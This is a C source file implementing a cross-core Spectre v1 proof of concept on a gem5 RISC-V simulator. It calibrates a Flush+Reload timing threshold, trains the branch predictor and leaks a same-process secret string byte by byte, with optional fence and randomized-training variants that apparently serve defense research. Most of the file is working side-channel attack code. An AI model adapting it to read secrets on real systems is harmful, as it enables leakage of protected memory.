
/*
 * Cross-core Spectre v1 — RV64GC gem5 O3CPU
 *
 * CPU 0: victim
 * CPU 1: attacker
 *
 * Uses measured cross-core hit/miss distributions
 * to choose the Flush+Reload threshold.
 *
 * Same-process educational Spectre experiment.
 */

 #define _GNU_SOURCE

 #include "../riscv_asm.h"
 #include "../color.h"
 
 #include <assert.h>
 #include <ctype.h>
 #include <inttypes.h>
 #include <stdbool.h>
 #include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <sys/mman.h>
 #include <pthread.h>
 #include <sched.h>
 
 #define PAGE_SIZE 4096
 #define SYMBOL_CNT 256
 #define STRIDE 64
 #define REP 16
 #define TRAINING_EPOCH 8
 #define BUF_SIZE 20
 
 #define TRAIN_MIN 6
 #define TRAIN_MAX 20
 
 /* NEW: Number of cross-core calibration samples per class. */
 #define CAL_REPS 48
 
 static uint64_t _rng_state =
     0x9e3779b97f4a7c15ull;
 
 static inline uint64_t rng_next(void)
 {
     uint64_t x = _rng_state;
     x ^= x << 13;
     x ^= x >> 7;
     x ^= x << 17;
     _rng_state = x;
     return x;
 }
 
 static volatile int _decorr_sink;
 
 static inline void decorrelate(uint64_t k)
 {
     int s = 0;
 
     for (uint64_t i = 0; i < k; i++) {
         if (rng_next() & 1u)
             s += 1;
         else
             s -= 2;
     }
 
     _decorr_sink = s;
 }
 
 const char *secret = "InfoSec!";
 
 
 /* ---------------- Original helpers ---------------- */
 
 static inline size_t csel(
     size_t T,
     size_t F,
     bool pred
 )
 {
     size_t mask = -(size_t)(!!pred);
     return (T & mask) | (F & ~mask);
 }
 
 static void decode_state(char *c, uint64_t *hits)
 {
     uint64_t most = 0;
     unsigned char raw = 0;
 
     /*
      * Skip 0..15 because legitimate branch
      * training touches those probe entries.
      */
     for (size_t i = 16; i < SYMBOL_CNT; i++) {
         if (hits[i] > most) {
             most = hits[i];
             raw = (unsigned char)i;
         }
     }
 
     *c = isprint(raw) ? raw : '?';
 
     printf(
         "  best='%c' (0x%02x, hits=%" PRIu64 ")\n",
         *c, raw, most
     );
 }
 
 
 /* ---------------- Original victim ---------------- */
 
 uint8_t array[16] = {
     0, 1, 2, 3, 4, 5, 6, 7,
     8, 9, 10, 11, 12, 13, 14, 15
 };
 
 volatile size_t array_size = 16;
 
 __attribute__((noinline))
 int victim(
     uint8_t *pages,
     size_t idx,
     size_t stride
 )
 {
     int sink = 0;
 
     if (idx < array_size) {
         SPEC_BARRIER();
         sink = pages[array[idx] * stride];
     }
 
     return sink;
 }
 
 
 /* ---------------- Cross-core state ---------------- */
 
 static pthread_barrier_t round_start;
 static pthread_barrier_t round_done;
 
 static pthread_t victim_tid;
 
 static uint8_t *shared_pages;
 static size_t malicious_index;
 
 static size_t round_char;
 static size_t round_rep;
 
 /*
  * NEW: Calibration request types.
  *
  * MODE_HIT: CPU 0 explicitly accesses one probe.
  * MODE_IDLE: CPU 0 accesses no probes.
  * MODE_ATTACK: execute the original Spectre loop.
  */
 enum {
     MODE_ATTACK = 1,
     MODE_HIT,
     MODE_IDLE,
     MODE_STOP
 };
 
 static int round_mode;
 static size_t round_probe;
 
 
 /* ---------------- CPU affinity ---------------- */
 
 static void pin_to_cpu(int cpu)
 {
 #ifdef GEM5_SE
     /*
      * gem5 SE mode does not implement sched_setaffinity (syscall 122 is
      * listed without a handler in src/arch/riscv/linux/se_workload.cc, so
      * calling it aborts the simulation). It does not need to: SE mode gives
      * each thread its own CPU context in creation order, so the main thread
      * runs on cpu0 and the pthread_create()d worker on cpu1. Victim and
      * attacker therefore sit on different cores sharing only the L2 --
      * exactly the topology this PoC wants. The roles are swapped relative
      * to a real Linux run (victim lands on cpu1), which is immaterial
      * because the two cores are configured identically.
      */
     (void)cpu;
     printf(
         "gem5 SE: thread auto-placed on CPU %d (affinity is a no-op)\n",
         sched_getcpu()
     );
 #else
     cpu_set_t mask;
 
     CPU_ZERO(&mask);
     CPU_SET(cpu, &mask);
 
     int err = pthread_setaffinity_np(
         pthread_self(),
         sizeof(mask),
         &mask
     );
 
     if (err != 0) {
         fprintf(
             stderr,
             "Pin CPU %d: %s\n",
             cpu,
             strerror(err)
         );
         exit(1);
     }
 
     printf(
         "Pinned CPU %d (running on %d)\n",
         cpu,
         sched_getcpu()
     );
 #endif
 }
 
 
 /* ---------------- Victim: CPU 0 ---------------- */
 
 static void *victim_worker(void *unused)
 {
     (void)unused;
 
     pin_to_cpu(0);
 
     for (;;) {
         pthread_barrier_wait(&round_start);
 
         int mode = round_mode;
 
         if (mode == MODE_STOP)
             break;
 
         /*
          * NEW: Positive calibration control.
          *
          * The victim performs a normal,
          * non-speculative access to the chosen
          * probe entry.
          */
         if (mode == MODE_HIT) {
             _maccess(
                 shared_pages + round_probe * STRIDE
             );
         }
 
         /*
          * NEW: Negative calibration control.
          *
          * Do not touch the probe array.
          */
         else if (mode == MODE_IDLE) {
             __asm__ __volatile__("" ::: "memory");
         }
 
         /*
          * Original Spectre training and attack.
          *
          * All calls execute consecutively on
          * CPU 0 without pthread synchronization
          * between training and the malicious call.
          */
         else if (mode == MODE_ATTACK) {
 
             size_t c = round_char;
 
 #ifndef RAND_TRAIN
             size_t r = round_rep;
 #endif
 
 #ifdef RAND_TRAIN
             size_t train = TRAIN_MIN +
                 (size_t)(
                     rng_next() %
                     (TRAIN_MAX - TRAIN_MIN + 1)
                 );
 #else
             size_t train = TRAINING_EPOCH - 1;
 #endif
 
             for (size_t t = 0; t <= train; t++) {
 
                 bool is_attack = (t == train);
 
 #ifdef RAND_TRAIN
                 size_t train_idx =
                     (size_t)(rng_next() % array_size);
 #else
                 size_t train_idx = r % array_size;
 #endif
 
                 size_t index = csel(
                     malicious_index + c,
                     train_idx,
                     is_attack
                 );
 
                 _mm_clflush((void *)&array_size);
                 _mm_mfence();
                 _mm_lfence();
 
 #ifdef RAND_TRAIN
                 decorrelate(
                     1u + rng_next() % 6u
                 );
 #endif
 
                 _no_opt(
                     victim(
                         shared_pages,
                         index,
                         STRIDE
                     )
                 );
             }
         }
 
         pthread_barrier_wait(&round_done);
     }
 
     return NULL;
 }
 
 
 /* ---------------- Attacker: CPU 1 ---------------- */
 
 /*
  * NEW: One shared helper for both calibration
  * and Spectre experiments.
  */
 static void execute_round(
     int mode,
     size_t probe_index,
     size_t c,
     size_t r
 )
 {
     round_mode = mode;
     round_probe = probe_index;
     round_char = c;
     round_rep = r;
 
     pthread_barrier_wait(&round_start);
     pthread_barrier_wait(&round_done);
 }
 
 
 /* ---------------- Cache helpers ---------------- */
 
 /*
  * Flush all 256 probe entries from CPU 1.
  */
 static void flush_probes(uint8_t *pages)
 {
     for (size_t j = 0; j < SYMBOL_CNT; j++) {
         _mm_clflush(pages + j * STRIDE);
     }
 
     _mm_mfence();
 }
 
 /*
  * Scan all 256 entries in the same order
  * during calibration and the real attack.
  *
  * This is important: the calibration must
  * reflect the measurement procedure.
  */
 static void scan_probes(
     uint8_t *pages,
     uint64_t times[SYMBOL_CNT]
 )
 {
     for (size_t i = 0; i < SYMBOL_CNT; i++) {
 
         size_t idx =
             (i * 167 + 13) % SYMBOL_CNT;
 
         times[idx] =
             _time_maccess(pages + idx * STRIDE);
     }
 }
 
 
 /* ---------------- Statistics helpers ---------------- */
 
 static int compare_u64(
     const void *a,
     const void *b
 )
 {
     uint64_t x = *(const uint64_t *)a;
     uint64_t y = *(const uint64_t *)b;
 
     return (x > y) - (x < y);
 }
 
 static uint64_t percentile(
     const uint64_t *samples,
     size_t n,
     unsigned pct
 )
 {
     uint64_t sorted[CAL_REPS];
 
     assert(n <= CAL_REPS);
     assert(pct <= 100);
 
     memcpy(
         sorted,
         samples,
         n * sizeof(uint64_t)
     );
 
     qsort(
         sorted,
         n,
         sizeof(uint64_t),
         compare_u64
     );
 
     size_t pos = ((n - 1) * pct) / 100;
 
     return sorted[pos];
 }
 
 
 /* ================================================
  * NEW: Actual cross-core timing calibration
  * ================================================ */
 
 /*
  * This replaces the old calibrate_latency().
  *
  * The old version measured one line entirely
  * on CPU 1, using averaged hit/miss latencies.
  *
  * The new version tests:
  *
  *   CPU 1 flushes 256 entries
  *   CPU 0 optionally loads selected entry
  *   CPU 1 scans all 256 entries
  *
  * This matches the actual cross-core channel.
  *
  * Each test uses a different printable ASCII
  * probe entry to avoid calibrating one fixed
  * address or one fixed scan position.
  */
 
 static uint64_t calibrate_cross_core(uint8_t *pages)
 {
     uint64_t hit[CAL_REPS];
     uint64_t miss[CAL_REPS];
 
     uint64_t times[SYMBOL_CNT];
 
     printf(
         "\nCross-core Flush+Reload calibration "
         "(%d hit and %d miss trials)...\n",
         CAL_REPS,
         CAL_REPS
     );
 
     for (size_t r = 0; r < CAL_REPS; r++) {
 
         /*
          * Cycle through different probe entries
          * in the printable ASCII range.
          *
          * This tests different scan positions.
          */
         size_t selected =
             32 + ((r * 37) % 95);
 
         /*
          * Positive: victim accesses selected.
          */
         flush_probes(pages);
 
         execute_round(
             MODE_HIT,
             selected,
             0,
             0
         );
 
         scan_probes(pages, times);
 
         hit[r] = times[selected];
 
         /*
          * Negative: victim does not access it.
          */
         flush_probes(pages);
 
         execute_round(
             MODE_IDLE,
             selected,
             0,
             0
         );
 
         scan_probes(pages, times);
 
         miss[r] = times[selected];
     }
 
 
     /* ---------------- Print distributions ---------------- */
 
     printf("\nMeasured latency distributions (cycles):\n");
 
     printf(
         "  Hit : p10=%" PRIu64
         "  p50=%" PRIu64
         "  p90=%" PRIu64 "\n",
         percentile(hit, CAL_REPS, 10),
         percentile(hit, CAL_REPS, 50),
         percentile(hit, CAL_REPS, 90)
     );
 
     printf(
         "  Miss: p10=%" PRIu64
         "  p50=%" PRIu64
         "  p90=%" PRIu64 "\n",
         percentile(miss, CAL_REPS, 10),
         percentile(miss, CAL_REPS, 50),
         percentile(miss, CAL_REPS, 90)
     );
 
 
     /*
      * Select a threshold from the actual
      * observed samples.
      *
      * We classify:
      *
      *   latency <= threshold -> cache hit
      *   latency >  threshold -> cache miss
      *
      * For every candidate threshold, calculate:
      *
      *   false negatives: victim accessed
      *                    but classified as miss
      *
      *   false positives: victim idle
      *                    but classified as hit
      *
      * Choose the threshold with the fewest
      * total classification errors.
      *
      * For equal error counts, prefer fewer
      * false positives, then a lower threshold.
      *
      * There is NO hardcoded cycle threshold.
      */
 
     uint64_t best_threshold = 0;
 
     int best_errors = 2 * CAL_REPS + 1;
     int best_fp = CAL_REPS + 1;
     int best_fn = CAL_REPS + 1;
 
     /*
      * Error counts can only change when a
      * threshold crosses one of the samples.
      *
      * Therefore, candidate thresholds 0 and
      * the observed latencies are sufficient.
      */
     for (int candidate = -1;
          candidate < 2 * CAL_REPS;
          candidate++) {
 
         uint64_t threshold;
 
         if (candidate == -1) {
             threshold = 0;
         } else if (candidate < CAL_REPS) {
             threshold = hit[candidate];
         } else {
             threshold = miss[candidate - CAL_REPS];
         }
 
         int fp = 0;
         int fn = 0;
 
         for (size_t j = 0; j < CAL_REPS; j++) {
 
             if (hit[j] > threshold)
                 fn++;
 
             if (miss[j] <= threshold)
                 fp++;
         }
 
         int errors = fp + fn;
 
         if (
             errors < best_errors ||
             (
                 errors == best_errors &&
                 fp < best_fp
             ) ||
             (
                 errors == best_errors &&
                 fp == best_fp &&
                 threshold < best_threshold
             )
         ) {
             best_errors = errors;
             best_fp = fp;
             best_fn = fn;
             best_threshold = threshold;
         }
     }
 
     printf(
         "\nAutomatically selected threshold: "
         "%" PRIu64 " cycles\n",
         best_threshold
     );
 
     printf(
         "Calibration classification: "
         "%d/%d correct\n",
         2 * CAL_REPS - best_errors,
         2 * CAL_REPS
     );
 
     printf(
         "False positives: %d/%d\n"
         "False negatives: %d/%d\n",
         best_fp,
         CAL_REPS,
         best_fn,
         CAL_REPS
     );
 
     /*
      * A good cross-core channel should have
      * strong separation between these classes.
      *
      * Warn rather than pretending recovery
      * results will be meaningful.
      */
     if (
         best_errors > CAL_REPS / 4
     ) {
         printf(
             "WARNING: Substantial overlap in "
             "cross-core latency distributions.\n"
         );
     }
 
     return best_threshold;
 }
 
 
 /* ================================================
  * Main
  * ================================================ */
 
 int main(void)
 {
     pin_to_cpu(1);
 
     printf("-----------------------------------------\n");
 
 #ifdef USE_LFENCE
     printf(
         CYAN_F
         "Variant: LFENCE "
         "(spec.fence defense ENABLED)\n"
         RESET_C
     );
 #else
     printf(
         YELLOW_F
         "Variant: BASELINE (no defense)\n"
         RESET_C
     );
 #endif
 
 #ifdef RAND_TRAIN
     printf(
         "Training: RANDOMIZED "
         "(run-length + history decorrelation)\n"
     );
 #else
     printf(
         "Training: PERIODIC (fixed epoch=%d)\n",
         TRAINING_EPOCH
     );
 #endif
 
     uint8_t *pages = mmap(
         NULL,
         STRIDE * SYMBOL_CNT,
         PROT_READ | PROT_WRITE,
         MAP_PRIVATE | MAP_ANONYMOUS,
         -1,
         0
     );
 
     assert(pages != MAP_FAILED);
 
     memset(pages, 1, STRIDE * SYMBOL_CNT);
 
     malicious_index =
         (uintptr_t)secret - (uintptr_t)array;
 
     shared_pages = pages;
 
     printf(
         "secret@%p array@%p  "
         "malicious_index=%#zx\n",
         (void *)secret,
         (void *)array,
         malicious_index
     );
 
     printf("-----------------------------------------\n");
 
     char buf[BUF_SIZE] = {0};
 
     size_t slen = strlen(secret);
 
     if (slen > BUF_SIZE - 1)
         slen = BUF_SIZE - 1;
 
 
     /* ---------------- Start CPU 0 ---------------- */
 
     assert(
         pthread_barrier_init(
             &round_start, NULL, 2
         ) == 0
     );
 
     assert(
         pthread_barrier_init(
             &round_done, NULL, 2
         ) == 0
     );
 
     int err = pthread_create(
         &victim_tid,
         NULL,
         victim_worker,
         NULL
     );
 
     if (err != 0) {
         fprintf(
             stderr,
             "pthread_create: %s\n",
             strerror(err)
         );
         return 1;
     }
 
 
     /* ---------------- NEW: Calibrate first ---------------- */
 
     uint64_t threshold =
         calibrate_cross_core(pages);
 
     printf("-----------------------------------------\n");
     printf(
         "Starting Spectre attack "
         "with measured threshold=%" PRIu64 "\n",
         threshold
     );
     printf("-----------------------------------------\n");
 
 
     /* ---------------- Spectre attack ---------------- */
 
     uint64_t times[SYMBOL_CNT];
 
     for (size_t c = 0; c < slen; c++) {
 
         uint64_t hits[SYMBOL_CNT] = {0};
 
         for (size_t r = 0; r < REP; r++) {
 
             /*
              * CPU 1 prepares the channel.
              */
             flush_probes(pages);
 
             /*
              * CPU 0 runs training and the
              * malicious call together.
              */
             execute_round(
                 MODE_ATTACK,
                 0,
                 c,
                 r
             );
 
             /*
              * CPU 1 measures the full array.
              *
              * Same scan function as calibration.
              */
             scan_probes(pages, times);
 
             for (size_t idx = 0;
                  idx < SYMBOL_CNT;
                  idx++) {
 
                 if (times[idx] <= threshold)
                     hits[idx]++;
             }
         }
 
         printf("char %zu:\n", c);
 
         decode_state(&buf[c], hits);
 
         if (c == 0) {
             for (size_t sidx = 0;
                  sidx < SYMBOL_CNT;
                  sidx++) {
 
                 printf(
                     "HIST %zu %" PRIu64 "\n",
                     sidx,
                     hits[sidx]
                 );
             }
         }
     }
 
 
     /* ---------------- Stop victim ---------------- */
 
     round_mode = MODE_STOP;
 
     pthread_barrier_wait(&round_start);
 
     pthread_join(victim_tid, NULL);
 
     pthread_barrier_destroy(&round_start);
     pthread_barrier_destroy(&round_done);
 
 
     /* ---------------- Results ---------------- */
 
     printf("-----------------------------------------\n");
 
     printf(
         "Expected : %.*s\n",
         (int)slen,
         secret
     );
 
     printf("Recovered: %s\n", buf);
 
     size_t ok = 0;
 
     for (size_t i = 0; i < slen; i++)
         ok += (buf[i] == secret[i]);
 
     printf(
         "Accuracy : %zu/%zu bytes\n",
         ok,
         slen
     );
 
     munmap(pages, STRIDE * SYMBOL_CNT);
 
     return 0;
 }
 